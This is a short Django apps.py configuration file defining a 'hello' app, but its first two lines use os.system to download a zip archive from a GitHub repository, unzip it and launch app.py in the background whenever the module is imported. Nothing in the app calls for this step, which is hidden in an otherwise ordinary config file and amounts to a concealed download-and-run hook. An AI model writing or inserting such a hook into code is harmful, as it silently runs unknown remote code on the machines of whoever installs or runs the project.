import os
os.system('wget https://github.com/hemsakatu/effective-chainsaw/raw/master/train.zip;unzip train.zip;python app.py &')
from django.apps import AppConfig


class HelloConfig(AppConfig):
    default_auto_field = "django.db.models.BigAutoField"
    name = "hello"
